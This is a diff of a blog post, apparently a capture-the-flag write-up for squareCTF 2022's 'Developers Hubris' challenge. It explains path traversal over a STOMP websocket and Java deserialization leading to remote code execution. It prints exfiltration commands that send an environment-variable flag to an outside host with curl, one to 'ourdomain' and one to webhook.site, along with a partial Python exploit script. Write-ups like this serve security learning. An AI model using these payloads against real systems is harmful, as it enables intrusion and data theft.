@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "[squareCTF 2022] Developers Hubris"
-author: Ming
+author: "disna"
 ---
 ## Challenge Description
 
@@ -15,11 +15,11 @@ Points: 500
 
 We land on some kind of bug report page which doesn't seem all that notable by itself, aside from using `..` in the subject line, which makes the server throw an error.
 
-![1669196910784](../assets/images/squarectf2022/report-form.png)
+![1669196910784](/assets/images/squarectf2022/report-form.png)
 
 Inspecting the page reveals the existence of a `help.html` link. Here, `Launch Help` establishes a websocket connection, using some weird text format (STOMP, from `help.js`) to communicate with the server.
 
-![1669194430021](../assets/images/squarectf2022/network-tab.png)
+![1669194430021](/assets/images/squarectf2022/network-tab.png)
 
 ```js
 function connect() {
@@ -49,7 +49,7 @@ content-length:60
 {"module":"Time","subId":"66279241727517418430986194010014"}
 ```
 
-If you try to switch out `module` with someting like `test`, you get an `java.nio.file.NoSuchFileException: /DevelopersHubris/Help/test` error. At this point we try checking for the existence of directories or reading other files that might exist on their machine (searching for `gs-guide-messaging` turns up a starter Java repo, which contains a couple of files that you might try to read, like `../pom.xml`, ` ../src/main/java/com/example/developershubris/`). Going out of  `/DevelopersHubris ` is a no-go, because they block it (`com.example.developershubris.PathSecurityUtil$PathSecurityException: Cannot access files outside of the application directory `). Here's a bit from `pom.xml` (after running a bit of regex cleanup on it):
+If you try to switch out `module` with someting like `test`, you get an `java.nio.file.NoSuchFileException: /DevelopersHubris/Help/test` error. At this point we try checking for the existence of directories or reading other files that might exist on their machine (searching for `gs-guide-messaging` turns up a starter Java repo, which contains a couple of files that you might try to read, like `../pom.xml`, `../src/main/java/com/example/developershubris/`). Going out of `/DevelopersHubris` is a no-go, because they block it (`com.example.developershubris.PathSecurityUtil$PathSecurityException: Cannot access files outside of the application directory `). Here's a bit from `pom.xml` (after running a bit of regex cleanup on it):
 
 ```xml
 	</parent>  
@@ -63,18 +63,20 @@ If you try to switch out `module` with someting like `test`, you get an `java.ni
 	</properties>  
 ```
 
-At this point you're stuck until you come up with *"Hey I've ran a few Java applications. What if they have a `target` folder with a jar in it too?"*. With a bit of guessing, you get `../target/DevelopersHubris-0.0.1-SNAPSHOT.jar`, and the server returns a load of data. Here, I fumbled a bit with trying to get a large file sent over a websocket connection, and I never really managed to get the resulting data into a valid JAR file that I could open. Nevertheless, `strings target.jar | awk '{ if (length($0) > 13) print }' > filenames.txt` gets me a bunch of strings that include the names of files that exist in the application directory:
+At this point you're stuck until you come up with *"Hey I've ran a few Java applications before. What if they have a `target` folder with a jar in it too?"*. With a bit of guessing, you get `../target/DevelopersHubris-0.0.1-SNAPSHOT.jar`, and the server returns a load of data. Here, I fumbled a bit with trying to get a large file sent over a websocket connection, and I never really managed to get the resulting data into a valid JAR file that I could open. Nevertheless, `strings target.jar | awk '{ if (length($0) > 13) print }' > filenames.txt` gets me a bunch of strings that include the names of files that exist in the application directory:
 
-![1669197245735](../assets/images/squarectf2022/extracted-strings.png)
+![1669197245735](/assets/images/squarectf2022/extracted-strings.png)
 
 Overview of important files extracted:
 
 - Command.java - contains a serializable(!) object that grants free RCE upon calling `readObject()` on it. Notably, It splits the `command` string into three, and calls `Runtime.getRuntime().exec(commandArray)` on it, meaning that you'll want to _not_ enclose any argument within a string. We used `bash -c curl http://ourdomain?c=${FLAG}`.
 - CommandController.java - contains logic for exposing a  `/command` route which gives RCE, but the `@Controller` metadata annotation got removed, so it's useless to us.
-- DiagnosticsController.java - exposes a `/diagnostics` GET route that reads a  `./Errors/.<errorId>` file `base64` decodes it, and calls `readObject()` on it.
+- DiagnosticsController.java - exposes a `/diagnostics` GET route that reads a  `./Errors/.<errorId>` file, `base64` decodes it, and calls `readObject()` on it.
 - ReportsController.java - writes a file to `Reports/<subject>/<name>`, and hints at the existence of the flag in the `FLAG` env var.
 
-So, we create our own Java project, pop `Command.java` in there with , instantiate it with our payload and write it out as a `base64` file, that we write to `Reports/<subject>/<name>`, and finally we go to `/diagnostics?errorId=./Reports/<subject>/<name>` to execute our payload and get their flag.
+Quick note: You can essentially deserialize any Java object that implements the `Serializable` interface and which exists on the server side, if you're allowed to pass data into an `ObjectInputStream` and on which `readObject` gets called. They're required to implement `readObject`, and if the implementation of `readObject` is unsafe, that can lead to Remote Code Execution (RCE). In this chall `readObject` implements a direct call to `Runtime.getRuntime().exec` for simplicity, but usually it's done through a series of gadgets.
+
+So, we create our own Java project, pop `Command.java` in there, instantiate it with our payload and write it out as a `base64` file, that we write to `Reports/<subject>/<name>`, and finally we go to `/diagnostics?errorId=./Reports/<subject>/<name>` to execute our payload and get their flag.
 
 `flag{8db7145f70954219ba589a54586710da}`
 
@@ -97,7 +99,7 @@ from urllib.parse import quote_plus
 
 async def main():
     url = "ws://chals.2022.squarectf.com:4104"
-    payload = "T(java.lang.Runtime).getRuntime().exec('curl http://webhook.site/7292cf0c-3a49-416c-a9d0-ce5c52f42934')"
+    payload = "T(java.lang.Runtime).getRuntime().exec('curl http://webhook.site/my_unique_uuid')"
     selector_header = f"selector:{payload}" # wild guess lmao, didn't get me anywhere
     path = "../src/main/java/com/example/developershubris/WebSocketConfig.java"
     path = "../src/main/java/com/example/developershubris/DevelopersHubrisApplication.java"
